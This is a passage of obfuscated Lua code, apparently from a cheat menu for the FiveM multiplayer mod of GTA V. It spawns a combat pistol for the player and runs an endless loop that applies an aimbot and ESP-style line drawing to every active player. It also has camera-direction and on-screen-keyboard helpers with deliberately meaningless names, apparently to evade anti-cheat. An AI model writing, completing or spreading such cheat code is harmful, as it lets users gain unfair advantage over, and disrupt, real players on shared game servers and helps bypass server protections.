            GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_COMBATPISTOL"), 250, 1, 1)
            while true do
                Citizen.Wait(1)
                for W, af in ipairs(GetActivePlayers()) do
                    ShootAimbotff(GetPlayerPed(af))
                    DoLines(GetPlayerPed(af))
                end
            end
        end
    )
end
function getCamDirectiondd()
    local bJ = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local bK = GetGameplayCamRelativePitch()
    local al = vector3(-math.sin(bJ * math.pi / 180.0), math.cos(bJ * math.pi / 180.0), math.sin(bK * math.pi / 180.0))
    local bL = math.sqrt(al.x * al.x + al.y * al.y + al.z * al.z)
    if bL ~= 0 then
        al = al / bL
    end
    return al
end
function jtmmoiaussibb(bM, bN, bO)
    AddTextEntry("FMMC_KEY_TIP9N", bM .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP9N", "", bN, "", "", "", bO)
    a78d8d85dssss = waduyh487r64ss
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end
    if UpdateOnscreenKeyboard() ~= 2 then
        local ad = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        return ad
    else
        Citizen.Wait(500)
        return false
    end
end
